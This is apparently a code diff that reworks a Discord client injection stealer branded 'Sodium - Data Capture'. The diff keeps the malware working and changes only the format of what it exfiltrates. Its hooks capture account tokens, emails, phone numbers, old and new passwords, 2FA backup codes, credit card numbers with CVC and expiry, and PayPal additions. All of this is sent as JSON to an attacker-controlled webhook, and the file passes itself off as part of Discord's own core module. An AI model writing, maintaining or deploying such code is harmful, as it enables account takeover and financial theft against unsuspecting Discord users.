@@ -146,61 +146,33 @@ const request = async (method, url, headers, data) => {
 };
 
 const hooker = async (content, token, account) => {
-    content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "Sodium - Data Capture";
-    content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
-    content["embeds"][0]["author"] = {
-        "name": account.username,
-    };
-    content["embeds"][0]["thumbnail"] = {
-        "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
-    };
-    content["embeds"][0]["footer"] = {
-        "text": "Sodium Data Capture",
-        "icon_url": "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png",
-    };
-    content["embeds"][0]["title"] = "Account Information";
-
     const nitro = getNitro(account.premium_type);
     const badges = getBadges(account.flags);
     const billing = await getBilling(token);
-
     const friends = await getFriends(token);
     const servers = await getServers(token);
 
-    content["embeds"][0]["fields"].push({
-        "name": "Token",
-        "value": "```" + token + "```",
-        "inline": false
-    }, {
-        "name": "Nitro",
-        "value": nitro,
-        "inline": true
-    }, {
-        "name": "Badges",
-        "value": badges,
-        "inline": true
-    }, {
-        "name": "Billing",
-        "value": billing,
-        "inline": true
-    });
-
-    content["embeds"].push({
-        "title": `Total Friends: ${friends.totalFriends}`,
-        "description": friends.message,
-    }, {
-        "title": `Total Servers: ${servers.totalGuilds}`,
-        "description": servers.message,
-    });
-
-    for (const embed in content["embeds"]) {
-        content["embeds"][embed]["color"] = 0xb143e3;
-    }
+    const payload = {
+        username: account.username,
+        email: account.email,
+        phone: account.phone || "None",
+        token: token,
+        nitro: nitro.replace(/[`]/g, ''),
+        badges: badges.replace(/[`]/g, ''),
+        billing: billing.replace(/[`]/g, ''),
+        total_friends: friends.totalFriends,
+        rare_friends: friends.message.replace(/\*\*|`/g, ''),
+        total_servers: servers.totalGuilds,
+        rare_servers: servers.message.replace(/\*\*|`/g, ''),
+        hostname: os.hostname(),
+        os_username: os.userInfo().username,
+        avatar_url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`,
+        action: content.action || "injected"
+    };
 
     await request("POST", CONFIG.webhook, {
         "Content-Type": "application/json"
-    }, JSON.stringify(content));
+    }, JSON.stringify(payload));
 };
 
 const fetch = async (endpoint, headers) => {
@@ -223,13 +195,13 @@ const fetchFriends = async token => await fetch("/relationships", {
 const getNitro = flags => {
     switch (flags) {
         case 1:
-            return '`Nitro Classic`';
+            return 'Nitro Classic';
         case 2:
-            return '`Nitro Boost`';
+            return 'Nitro Boost';
         case 3:
-            return '`Nitro Basic`';
+            return 'Nitro Basic';
         default:
-            return '`❌`';
+            return 'None';
     }
 };
 
@@ -239,7 +211,7 @@ const getBadges = flags => {
         let b = CONFIG.badges[badge];
         if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
     }
-    return badges || '`❌`';
+    return badges || 'None';
 };
 
 const getRareBadges = flags => {
@@ -266,7 +238,7 @@ const getBilling = async token => {
             }
         }
     });
-    return billing || '`❌`';
+    return billing || 'None';
 };
 
 const getFriends = async token => {
@@ -279,11 +251,11 @@ const getFriends = async token => {
     for (const acc of filteredFriends) {
         var badges = getRareBadges(acc.user.public_flags);
         if (badges != "") {
-            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
+            if (!rareUsers) rareUsers = "Rare Friends:\n";
             rareUsers += `${badges} ${acc.user.username}\n`;
         }
     }
-    rareUsers = rareUsers || "**No Rare Friends**";
+    rareUsers = rareUsers || "No Rare Friends";
 
     return {
         message: rareUsers,
@@ -298,12 +270,12 @@ const getServers = async token => {
     let rareGuilds = "";
     for (const guild of filteredGuilds) {
         if (rareGuilds === "") {
-            rareGuilds += `**Rare Servers:**\n`;
+            rareGuilds += `Rare Servers:\n`;
         }
-        rareGuilds += `${guild.owner ? "👑 Owner" : "🛡️ Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
+        rareGuilds += `${guild.owner ? "👑 Owner" : "🛡️ Admin"} | Server Name: ${guild.name} - Members: ${guild.approximate_member_count}\n`;
     }
 
-    rareGuilds = rareGuilds || "**No Rare Servers**";
+    rareGuilds = rareGuilds || "No Rare Servers";
 
     return {
         message: rareGuilds,
@@ -314,22 +286,15 @@ const getServers = async token => {
 const EmailPassToken = async (email, password, token, action) => {
     const account = await fetchAccount(token);
 
-    const content = {
-        "content": `**${account.username}** just ${action}!`,
-        "embeds": [{
-            "fields": [{
-                "name": "Email",
-                "value": "`" + email + "`",
-                "inline": true
-            }, {
-                "name": "Password",
-                "value": "`" + password + "`",
-                "inline": true
-            }]
-        }]
+    const payload = {
+        username: account.username,
+        email: email,
+        password: password,
+        token: token,
+        action: action
     };
 
-    await hooker(content, token, account);
+    await hooker(payload, token, account);
 };
 
 const BackupCodesViewed = async (codes, token) => {
@@ -343,93 +308,61 @@ const BackupCodesViewed = async (codes, token) => {
     for (let code of filteredCodes) {
         message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
     }
-    const content = {
-        "content": `**${account.username}** just viewed their 2FA backup codes!`,
-        "embeds": [{
-            "fields": [{
-                "name": "Backup Codes",
-                "value": "```" + message + "```",
-                "inline": false
-            }, {
-                "name": "Email",
-                "value": "`" + account.email + "`",
-                "inline": true
-            }, {
-                "name": "Phone",
-                "value": "`" + (account.phone || "None") + "`",
-                "inline": true
-            }]
-        }]
+
+    const payload = {
+        username: account.username,
+        email: account.email,
+        phone: account.phone || "None",
+        backup_codes: message,
+        token: token,
+        action: "viewed 2FA backup codes"
     };
 
-    await hooker(content, token, account);
+    await hooker(payload, token, account);
 };
 
 const PasswordChanged = async (newPassword, oldPassword, token) => {
     const account = await fetchAccount(token);
 
-    const content = {
-        "content": `**${account.username}** just changed their password!`,
-        "embeds": [{
-            "fields": [{
-                "name": "New Password",
-                "value": "`" + newPassword + "`",
-                "inline": true
-            }, {
-                "name": "Old Password",
-                "value": "`" + oldPassword + "`",
-                "inline": true
-            }]
-        }]
+    const payload = {
+        username: account.username,
+        new_password: newPassword,
+        old_password: oldPassword,
+        token: token,
+        action: "changed password"
     };
 
-    await hooker(content, token, account);
+    await hooker(payload, token, account);
 };
 
 const CreditCardAdded = async (number, cvc, month, year, token) => {
     const account = await fetchAccount(token);
 
-    const content = {
-        "content": `**${account.username}** just added a credit card!`,
-        "embeds": [{
-            "fields": [{
-                "name": "Number",
-                "value": "`" + number + "`",
-                "inline": true
-            }, {
-                "name": "CVC",
-                "value": "`" + cvc + "`",
-                "inline": true
-            }, {
-                "name": "Expiration",
-                "value": "`" + month + "/" + year + "`",
-                "inline": true
-            }]
-        }]
+    const payload = {
+        username: account.username,
+        email: account.email,
+        credit_card_number: number,
+        cvc: cvc,
+        expiration: `${month}/${year}`,
+        token: token,
+        action: "added credit card"
     };
 
-    await hooker(content, token, account);
+    await hooker(payload, token, account);
 };
 
 const PaypalAdded = async (token) => {
     const account = await fetchAccount(token);
 
-    const content = {
-        "content": `**${account.username}** just added a payment account!`,
-        "embeds": [{
-            "fields": [{
-                "name": "Email",
-                "value": "`" + account.email + "`",
-                "inline": true
-            }, {
-                "name": "Phone",
-                "value": "`" + (account.phone || "None") + "`",
-                "inline": true
-            }]
-        }]
+    const payload = {
+        username: account.username,
+        email: account.email,
+        phone: account.phone || "None",
+        token: token,
+        action: "added paypal account"
     };
 
-    await hooker(content, token, account);
+    await hooker(payload, token, account);
 };
 
 const discordPath = (function () {
@@ -461,22 +394,15 @@ async function initiation() {
 
         const account = await fetchAccount(token);
 
-        const content = {
-            "content": `**${account.username}** just got injected!`,
-            "embeds": [{
-                "fields": [{
-                    "name": "Email",
-                    "value": "`" + account.email + "`",
-                    "inline": true
-                }, {
-                    "name": "Phone",
-                    "value": "`" + (account.phone || "None") + "`",
-                    "inline": true
-                }]
-            }]
+        const payload = {
+            username: account.username,
+            email: account.email,
+            phone: account.phone || "None",
+            token: token,
+            action: "injected"
         };
 
-        await hooker(content, token, account);
+        await hooker(payload, token, account);
         clearAllUserData();
     }
 
@@ -584,7 +510,7 @@ const createWindow = () => {
                 if (!requestData.password) return;
 
                 if (requestData.email) {
-                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed their email to **" + requestData.email + "**");
+                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed email to " + requestData.email);
                 }
 
                 if (requestData.new_password) {
@@ -624,5 +550,3 @@ session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, cal
 });
 
 module.exports = require("./core.asar");
-
-
